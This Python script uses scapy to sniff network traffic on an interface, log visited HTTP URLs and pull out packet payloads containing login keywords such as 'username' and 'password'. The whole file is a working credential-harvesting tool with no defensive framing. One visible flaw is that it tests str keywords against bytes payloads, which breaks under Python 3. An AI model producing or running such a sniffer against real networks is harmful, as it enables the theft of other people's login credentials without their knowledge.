import scapy.all as scapy 
from scapy.layers import http


def sniff(interface: str) -> None:
    '''Takes interface to sniff data'''
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
 
def get_url(packet) -> str:
    '''Takes the packet and returns all the urls'''
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    
    
def get_login_info(packet):
    '''Takes packet and returns user credentials'''
    if packet.haslayer(scapy.Raw):
        # printing a data from all layers.
        # print(packet.show()) 
        # printing a specific field from packet
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
            
        for keyword in keywords:
            if keyword in load:
                return load
    
    
def process_sniffed_packet(packet) -> None:
    '''Takes Packets and Prints it'''
    print(type(packet))
    # filtering a data from packets
    if packet.haslayer(http.HTTPRequest):
        # print a urls
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
                
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")        
    
    
sniff("eth0")